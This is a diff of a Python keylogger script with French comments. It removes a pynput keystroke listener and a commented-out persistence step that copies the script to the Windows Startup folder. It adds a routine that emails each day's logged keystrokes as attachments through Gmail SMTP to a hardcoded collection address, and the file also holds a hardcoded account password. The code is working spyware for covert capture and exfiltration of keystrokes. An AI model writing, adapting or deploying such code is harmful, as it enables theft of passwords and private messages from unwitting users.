@@ -1,44 +1,13 @@
-from pynput.keyboard import Listener
-
 import os
-import logging 
 import datetime
 import time
 
-from shutil import copyfile
-
-username = os.getlogin()
-nomFichierActuelle = os.path.basename(__file__)
-
-# **** AU DEMARRAGE
-#copyfile(nomFichierActuelle,f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{nomFichierActuelle}")
-#flm juste creer un raccourci et colle le
-# **** EMPLACEMENT SAUVEGARDE
 NOM_DOSSIER_SECRET = "C:/data_key_screen"
-
-nomEmplacementSauvegarde = NOM_DOSSIER_SECRET 
-if not os.path.exists(nomEmplacementSauvegarde):
-	os.makedirs(nomEmplacementSauvegarde)
-
 dateajd = datetime.datetime.now().strftime('%Y-%m-%d')
 datehier = (datetime.datetime.now()++ datetime.timedelta(days=-1)).strftime('%Y-%m-%d')
 dateheure = datetime.datetime.now().strftime('%H:%M:%S')
+username = os.getlogin()
 
-
-
-nomEmplacementSauvegarde += "/" + dateajd #dossier à la date de aujourd'hui
-if not os.path.exists(nomEmplacementSauvegarde):
-	os.makedirs(nomEmplacementSauvegarde)
-nomfile = username + " touch " + dateajd + ".txt"
-nomfile_hier = username + " touch " + datehier + ".txt"
-# **** YEAH SAUGARDES DES TOUCHE SUR FICHIER TXT
-logging_dir = nomEmplacementSauvegarde
-FORMATT = dateheure + " %(message)s"
-logging.basicConfig(filename=f"{logging_dir}/{nomfile}", level=logging.DEBUG, format=FORMATT)
-
-# **** FCT POUR ACTUALISER LE FICHIER DANS ACT
-
-# **** FCT POUR ENVOYER LE BAIL PAR MAIL
 
 import smtplib
 from email.mime.text import MIMEText
@@ -52,6 +21,7 @@ def email_alert(subject,body,to, liste_file=""):
     msg['subject'] = subject
     msg['to'] = to
     user = "KeyLoggerVeski@gmail.com"
+    
     msg['from'] = user
     password = "sslezqomykvdhggd"
     
@@ -75,19 +45,36 @@ def email_alert(subject,body,to, liste_file=""):
     server.login(user,password)
     server.send_message(msg)
     
+    print("###" + subject + " ok the mail send to KeyLoggerVeski@gmail.com")
     server.quit()
 
 
-def on_press(key):        
-    print(key)
-    logging.info(key)
-    
-with Listener(on_press=on_press) as lis:
-    lis.join()
 
-    
-    
-    
+def send_log_dossier(NOM_DOSSIER_SECRET,dateee):
+	global dateheure
+	
+	dossierhier = NOM_DOSSIER_SECRET+"/"+dateee #le dossier
+	nomfile_hier = username + " touch " + dateee + ".txt" #le fichier log
+	if os.path.exists(dossierhier):
+		
+		if not os.path.exists(dossierhier +"/ok_sent.txt"):
+			listefichiers = [f"{dossierhier}/{nomfile_hier}"]
+							
+			email_alert(nomfile_hier,"yes","KeyLoggerVeski@gmail.com",listefichiers)
+			
+			#ok c'est fait, c'est noté
+			fichierok = open(dossierhier+"/ok_sent.txt", "a")
+			fichierok.write(f"{dossierhier}/{nomfile_hier} file sent at {dateheure},to KeyLoggerVeski@gmail.com \n")
+			fichierok.close()
+			print("## " + dossierhier+"/ok_sent.txt")
+		else:
+			print(" * " + nomfile_hier + " DEJA ENVOYER CHKAL")
 
-	  
+print(os.listdir(NOM_DOSSIER_SECRET))
+for dos in os.listdir(NOM_DOSSIER_SECRET):
+	if dos != dateajd:
+		send_log_dossier(NOM_DOSSIER_SECRET,dos)
+	else:
+		print(f" * dont sent dir of today {dateajd}")				
 
+staller = input("Press ENTER to close")
